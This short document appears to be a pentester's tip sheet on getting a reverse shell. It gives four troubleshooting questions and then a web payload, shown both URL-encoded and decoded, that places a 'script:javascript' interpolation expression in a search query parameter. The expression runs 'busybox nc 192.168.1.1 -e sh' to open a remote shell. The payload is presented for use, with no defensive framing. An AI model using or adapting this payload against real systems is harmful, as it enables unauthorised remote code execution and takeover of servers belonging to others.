4 Rules when trying to get Reverse Shell

- Is your payload correct? busy box?

- Is your port correct?

- If you can't execute shell via 1 liner. Write reverse shell file to file system then execute.

- what kind of reverse shell? 

Encoded:search?query="%24{script%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('busybox nc 192.168.1.1 -e sh')}"
Decoded:search?query="${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.1.1 -e sh')}"
